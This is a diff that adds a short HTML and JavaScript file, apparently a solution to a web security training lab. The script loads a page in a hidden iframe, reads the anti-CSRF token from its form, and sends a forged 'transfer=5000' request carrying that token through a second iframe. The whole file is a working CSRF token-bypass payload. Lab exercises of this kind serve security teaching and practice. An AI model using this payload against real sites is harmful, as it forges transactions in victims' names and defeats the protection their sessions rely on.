@@ -1,0 +1,14 @@
+<script language="javascript">
+
+function getToken()
+{
+    var theDoc = document.getElementById("iframe1").contentDocument.getElementsByTagName("form")[0];
+    var token = '&token=' + theDoc.token.value;
+    var temp = document.getElementById("iframe2");
+    temp.src="attack?Screen=803158781&menu=900&transfer=5000" + token;
+}
+
+</script>
+
+<iframe src="attack?Screen=803158781&menu=900&transfer=main" onload="getToken();"id="iframe1"></iframe>
+<iframe id="iframe2"></iframe>
